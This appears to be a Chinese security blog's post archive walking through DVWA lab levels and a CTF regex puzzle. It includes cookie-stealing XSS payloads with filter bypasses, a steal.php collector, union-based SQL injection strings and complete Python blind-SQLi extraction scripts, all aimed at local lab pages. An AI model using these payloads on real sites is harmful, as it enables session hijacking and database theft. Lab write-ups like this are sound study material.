但是再次刷新进入页面时，每次都会跳转回steal.php，并写入一次cookie值，这难免会引起用户的怀疑 这里可以采用ajax技术，即创建一个用javascript代码创建一个XMLHttpRequest对象，这个对象可以在后台与服务器交换数据，就不需要跳转到steal.php了 脚本如下： 12345678910111213var url = \"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr = \"data=\"+document.cookie;var ajax = null;if (window.XMLHttpRequest) &#123; ajax = new XMLHttpRequest();&#125; else if (window.ActiveXObject) &#123; ajax = new ActiveXObject(\"Microsoft.XMLHTTP\");&#125; else &#123; ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");ajax.send(postStr); 然后POST 每次访问页面都会讲cookie值写入数据库 Medium代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);include(&quot;../sql-connection.php&quot;);if(isset($_POST[&apos;btnSign&apos;]))&#123; $message=trim($_POST[&apos;mtxMessage&apos;]); $name=trim($_POST[&apos;txtName&apos;]); $message=strip_tags($message); $message=mysql_real_escape_string($message); $message=htmlspecialchars($message); $name=mysql_real_escape_string($name); $name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$name); $sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;; $result=mysql_query($sql); &#125;if(isset($_POST[&apos;btnClear&apos;]))&#123; $sql=&quot;DELETE FROM guestbook&quot;; $result=mysql_query($sql);&#125;$sql=&quot;SELECT name,comment FROM guestbook&quot;;$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;; echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;&#125;?&gt; 可以看出这关对message进行了丢弃标签的过滤，而且使用了htmlspecialchars这个函数，这个函数可以使html标签实体化，让标签不再是标签，完全防止了xss注入，所以这关只能在name注入，但是name同时也过滤了script标签，但是没事，跟之前关卡一样，我们可以采用双写绕过过滤 在name中输入 1&lt;s&lt;script&gt;cript&gt;alert(‘xss’)&lt;/script&gt; 成功弹窗 那么继续思考如何窃取cookie，答案就是双写 输入 1&lt;s&lt;script&gt;cript src=’cookie.js’&gt;&lt;/script&gt; 成功窃取到cookie值 High代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);include(&quot;../sql-connection.php&quot;);if(isset($_POST[&apos;btnSign&apos;]))&#123; $message=trim($_POST[&apos;mtxMessage&apos;]); $name=trim($_POST[&apos;txtName&apos;]); $message=strip_tags($message); $message=mysql_real_escape_string($message); $message=htmlspecialchars($message); $name=mysql_real_escape_string($name); $name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$name); $sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;; $result=mysql_query($sql); &#125;if(isset($_POST[&apos;btnClear&apos;]))&#123; $sql=&quot;DELETE FROM guestbook&quot;; $result=mysql_query($sql);&#125;$sql=&quot;SELECT name,comment FROM guestbook&quot;;$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;; echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;&#125;?&gt; 这里对name进行了正则匹配过滤掉了包含按顺序的&lt;,s,c,r,i,p,t字符组成的字符串，所以这里只能通过触发onerror事件来执行js代码 通过加载图片过程发生异常触发onerror事件 在name中输入 1&lt;image src=# onerror=(alert(‘xss’))&gt; 输入 1&lt;img src=# onerror='var url=\"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr=\"data=\"+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject(\"M&amp;#x69;crosoft.XMLHTTP\");&#125;else&#123;ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded\");ajax.send(postStr);'&gt; 将ajax代码执行，将cookie值POST到steal.php 但在输入之前，我们应该先改一下数据列name的长度，之前设定长度为100，但是我们输入的明显超过了100,在mysql命令行输入 1alter table guestbook modify name varchar(500); 成功窃取到cookie值","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-xss(reflected)","slug":"dvwa-xss(reflected)","date":"2018-07-11T11:42:00.000Z","updated":"2018-07-11T13:35:48.318Z","comments":true,"path":"/posts/52787/","link":"","permalink":"https://Foxgrin.github.io/posts/52787/","excerpt":"总结了dvwa中的反射型xss关卡","text":"总结了dvwa中的反射型xss关卡 Low代码复现如下： 12345678910&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 当我们GET一个name值以后，服务器毫无过滤的通过echo输出我们GET的name值，而如果我们输入的是一串代码，则这串代码通过echo就会被执行，这就是反射型的xss漏洞，我们可以通过GET方式输入一串js代码构造一个注入js代码的网页，当受害者访问这个url时，js代码将会自动实现，从而达到恶意攻击目的 比如我们输入 1&lt;script&gt;alert('xss')&lt;/script&gt; 于是我们可以利用这个xss漏洞获取服务器的cookie值，然后将cookie值存入数据库 先创建一个存放cookie的数据库 在mysql命令行输入： 12345678910111213create database dvwacookie;use dvwacookie;create table low(id int primary key,cookie varchar(100) ); 然后在编写一个cookie.js的脚本 这个脚本作用是创建隐藏表单，表单提交到steal.php，提交的内容是cookie值 接下来编写steal.php，自然就是将提交cookie值写入数据库里了 steal.php代码: 1234567891011&lt;?php$con=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);mysql_select_db(&apos;dvwacookie&apos;,$con);if(isset($_POST[&apos;data&apos;]))&#123; $sql=&quot;INSERT INTO low(cookie) VALUES (&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;)&quot;; $result=mysql_query($sql);&#125;?&gt; 然后回到存在xss漏洞的网页，通过GET传入name值 1&lt;script src=cookie.js&gt;&lt;/script&gt; 查看数据库 成功获得cookie值 Medium代码复现如下： 1234567891011&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; $name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$_GET[&apos;name&apos;]); echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 源代码利用了str_replace函数对script标签进行了过滤 不过没关系，因为函数只执行了一次，所以用双写的方法就可以很轻松的解决 输入 1&lt;s&lt;script&gt;cript&gt;alert('xss')&lt;/script&gt; 之后跟low关卡一样，输入 1&lt;s&lt;script&gt;cript src=cookie.js&gt;&lt;/script&gt; 获得cookie值 High代码复现如下： 1234567891011&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; $name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$_GET[&apos;name&apos;]); echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 这关利用了一个正则匹配过滤函数，i表示大小写，也就是以&lt;开头，以t结尾的字符串，只要中间按顺序包含&lt;script，则会立刻被过滤掉，之前双写绕过过滤的方法在这里行不通 绕过方法是采用触发onerror事件来执行javascript代码 onerror事件会在文档或者图像加载过程中发生错误时触发 例如，我们输入 1&lt;img src=# onerror=alert(“xss”)&gt; 果然，加载图片时发现不存在这个图片发生错误所以触发了onerror事件，然后执行了alert(“xss”)代码 那么我们再考虑怎么像之前两关一样获得cookie值 之前是通过script标签的src属性引用外部的cookie.js文件，将cookie值以POST形式传入steal.php，再将POST的cookie值写入数据库 但是很明显这关对script标签做了正则过滤，只要我们输入含有这几个字符，都会被过滤掉，所以这里可以用location.href跳转链接到steal.php，将cookie值写入数据库，所以这里只能用GET方式将cookie值传入steal.php 于是输入 1&lt;img src=# onerror=(location.href=”http://127.0.0.1/demo/xss(reflected)/steal.php?data=”+document.cookie)&gt; 但是结果却是 为什么呢 仔细检查发现我们输入里面 1&lt;img SrC=# oneRror=(locatIon.href=”httP://127.0.0.1/demo/xss(reflected)/steal.php?data=”+document.cookie)&gt; 大写字母构成了&lt;script，所以被过滤掉了 所以我们可以采用先获得cookie值，然后将cookie值传入steal.php 输入 1&lt;img src=# onerror=(alert(document.cookie))&gt; 在将这个cookie值传入steal.php 还有种方法是对某个关键过滤字符进行html编码，但是我亲测不行，不知道什么原因，还望大神指点原因","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-sql(blind)","slug":"dvwa-sql(blind)","date":"2018-07-11T07:39:00.000Z","updated":"2018-07-11T10:36:59.664Z","comments":true,"path":"/posts/55409/","link":"","permalink":"https://Foxgrin.github.io/posts/55409/","excerpt":"总结了dvwa中的sql盲注关卡","text":"总结了dvwa中的sql盲注关卡 Low代码复现如下： 123456789101112131415161718&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果 我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用 没有查询结果，也就是说联合注入不能用 剩下的也就是盲注 盲注又可以分为基于时间的盲注和布尔型的盲注 从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果 我们先输入1，发现有返回结果 再输入1’，发现没有返回结果 输入1’#，发现有返回结果 说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注 and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句 把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度 输入1’ and length(database())=4# 而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒 但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了 我们先通过基于时间的盲注获取数据库名的长度 1234567891011for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break 这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度 有了数据库名的长度，就可以获取数据库名 12345678910111213for i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break 先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符 同样的方法获取数据表的长度 12345678910111213for i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break 获取数据表名： 1234567891011121314151617for i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+',' 获取users表下数据列总长度： 12345678910for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break 这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的 获取数据列名： 1234567891011121314for i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+',' 总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力 下面贴上本关完整的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import requestsurl='http://127.0.0.1/demo/sqli(blind)-low.php'database_length=0table_length=0column_length=0database=''table_name=''column_name=''#获取数据库长度:4for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break#获取数据库名:dvwafor i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break#获取所有数据表总长度:15for i in range(11,16): data=&#123; 'id':\"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print(t) if(t&lt;5): table_length=i print('The length of table is:',table_length) break#获取所有数据表名:guestbook,usersfor i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+','#获取所有数据列总长度:94for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,passwordfor i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+',' Medium代码复现如下： 12345678910111213141516171819&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $id=mysql_real_escape_string($id); $sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可 High代码复现如下： 1234567891011121314151617181920&lt;?phpsession_start();include(&quot;sql-connection.php&quot;);if (isset($_SESSION[&apos;id&apos;]))&#123; $id=$_SESSION[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询 这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象 以获取数据库名长度为例子说明： 12345678910111213for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break 先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面 其他的改法类似，就不一一赘述了 下面贴上本关完整脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113import requestsurl_input=\"http://127.0.0.1/demo/session-input.php\"url_index=\"http://127.0.0.1/demo/sqli(blind)-high.php\"database_length=0table_length=0column_length=0database=''table_name=''column_name=''#获取数据库长度:4for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break#获取数据库名:dvwafor i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break#获取所有数据表总长度:15for i in range(11,16): data=&#123; 'id':\"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print(t) if(t&lt;5): table_length=i print('The length of table is:',table_length) break#获取所有数据表名:guestbook,usersfor i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+','#获取所有数据列总长度:94for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,passwordfor i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+','","categories":[{"name":"dvwa-sql","slug":"dvwa-sql","permalink":"https://Foxgrin.github.io/categories/dvwa-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"dvwa-sql","slug":"dvwa-sql","date":"2018-07-10T13:44:00.000Z","updated":"2018-07-11T07:21:27.549Z","comments":true,"path":"/posts/39291/","link":"","permalink":"https://Foxgrin.github.io/posts/39291/","excerpt":"总结了dvwa中的sql注入关卡","text":"总结了dvwa中的sql注入关卡 Low代码复现如下： 1234567891011121314151617&lt;?phpinclude (&quot;sql-connection.php&quot;);if (isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关毫无过滤的sql语句 提示输入id，判断可能是数字型注入 输入1 再输入1’ 出现报错，从错误信息判断是数字型注入，且被单引号包裹 输入1’# 没有报错 接下来判断查询字段数 输入1’ order by 3 说明查询字段数为2 那么就用联合查询来爆库 输入0’ union select database(),2 # 输入0’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()# 爆表 输入0’ union select group_concat(column_name),2 from information_schema.columns where table_name=’users’# 爆列 输入0’ union select password,user_id from users # 爆数据 Medium代码复现如下： 1234567891011121314151617&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $id=mysql_real_escape_string($id); $sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;; $result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关很明显是数字型注入，通过选择表单中的数字作为注入点，我们可以用burp抓包修改post的id值 这里id值虽然通过mysql_real_escape函数被转义处理，但是由于id没有被引号包裹，所以没有什么区别 先判断查询字段数 字段数为2 接下来爆库 爆表 爆列 因为这里单引号被包裹，所以users可以转成十六进制数从而绕过转义 爆数据 High这关有两个页面，一个页面用来输入id值，输入的id值经过sql查询后的信息显示在主页面上 输入id值的页面代码如下： 1234567891011&lt;?phpsession_start();if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $_SESSION[&apos;id&apos;]=$_POST[&apos;id&apos;];&#125;echo &quot;Session ID:&quot;.$_SESSION[&apos;id&apos;];?&gt; 主页面代码如下： 123456789101112131415161718&lt;?phpsession_start();include(&quot;sql-connection.php&quot;);if (isset($_SESSION[&apos;id&apos;]))&#123; $id=$_SESSION[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关把post的id值赋值给session的id值 注入点仍然是id值 跟上面关卡没什么本质区别 爆库 爆表 爆列 爆数据","categories":[{"name":"dvwa-sql","slug":"dvwa-sql","permalink":"https://Foxgrin.github.io/categories/dvwa-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"数字验证正则绕过","slug":"数字验证正则绕过","date":"2018-07-10T12:39:00.000Z","updated":"2018-07-10T13:28:30.327Z","comments":true,"path":"/posts/25617/","link":"","permalink":"https://Foxgrin.github.io/posts/25617/","excerpt":"Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag","text":"Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag 源代码如下： 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = &apos;flag&#123;test&#125;&apos;;if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])&#123; $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配 &#123; echo &apos;flag&apos;; exit; &#125; while (TRUE) &#123; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; &#125;&#125;?&gt; 请求方法必须为POST 首先弄明白正则匹配函数： preg_match：执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0 preg_match_all:执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止 再弄明白几个正则匹配的特殊字符： [:graph:] : 除空格，TAB外的所有字符[:punct:] : 任何标点符号[:digit:] : 任何数字[:upper:] : 任何大写字母[:lower:] : 任何小写字母 接下来来到第一个判断地方： 12345if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配&#123; echo &apos;flag&apos;; exit;&#125; 如果这个if语句执行成功，那么我们就获取不到后面的flag值，所以不能让if执行，也就是preg_match必须返回1，即正则匹配成功 在看正则表达式’/^[[:graph:]]{12,}$/’ 必须以任意一个除空格，TAB外的标点符号开头和结尾，且出现至少12次 验证如下： 123456789&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; $a=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password); echo &apos;$a=&apos;.$a;&#125;?&gt; 输入12个1，看到结果返回1 输入小于12个，看到结果返回0 这里需要注意，输入’+’ 会被当做是空格处理，要先将’+’进行URL编码%2b 综上，第一个输入要求，输入除空格,TAB外的字符至少十二次 在看下一个判断条件： 123$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;if (6 &gt; preg_match_all($reg, $password, $arr)) break; 如果if语句成功执行，break退出循环，我们就得不到flag值 所以我们不能让if语句成功执行，也就是说要让全局匹配成功次数大于6次 在看正则表达式’/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/’ 因为是全局匹配，所以匹配成功的条件是检测到任何符号出现1次以上或者任何数字出现1次以上或者任何大写字母出现1次以上或者任何小写字母出现1次以上，一旦匹配成功一次，就开始检测下一次的匹配，这么说有点难理解，直接上代码验证： 1234567891011&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; $a=preg_match_all($reg,$password,$arr); echo &apos;$a=&apos;.$a.&quot;&lt;br&gt;&quot;; print_r($arr);&#125;?&gt; 这里输入1aB. 匹配的过程是这样的:先检测到1，符合[:digit:]出现1次，继续检测，检测到a，符合[:lower:]出现1次，继续检测，以此类推，所以最后检测成功次数为4 同时也可以看出返回的数组有两个元素，第一个元素是整个匹配结果，第二个元素是子模式的匹配结果 关于返回数组的详情可以参考：https://blog.csdn.net/qq_27988539/article/details/77366329 这题因为不牵涉到数组，就不详细研究 重点关注成功匹配的次数 